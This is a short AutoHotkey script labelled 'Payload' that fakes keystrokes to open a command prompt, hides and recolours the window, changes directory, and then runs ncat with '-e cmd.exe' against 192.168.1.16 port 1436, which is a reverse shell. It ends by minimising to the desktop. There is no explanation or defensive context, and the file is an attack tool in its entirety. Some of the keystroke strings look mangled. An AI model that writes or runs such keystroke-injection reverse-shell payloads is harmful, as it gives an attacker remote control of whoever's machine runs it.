#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

Goto, Payload

Payload:
Sleep, 1000
Send #r
Sleep, 1000
Send cmd
Send {Enter}
Sleep, 1000
Send mode con+.cols+718 lines+71 
Send {Enter}
Sleep, 100
Send color FE
Send {Enter}
Send cd +6D D+.^!qThing^!q
Send {Enter}
Sleep, 100
Send ncat.exe 192.168.1.16 1436 -e cmd.exe
Send {Enter}
Sleep, 100
Send #d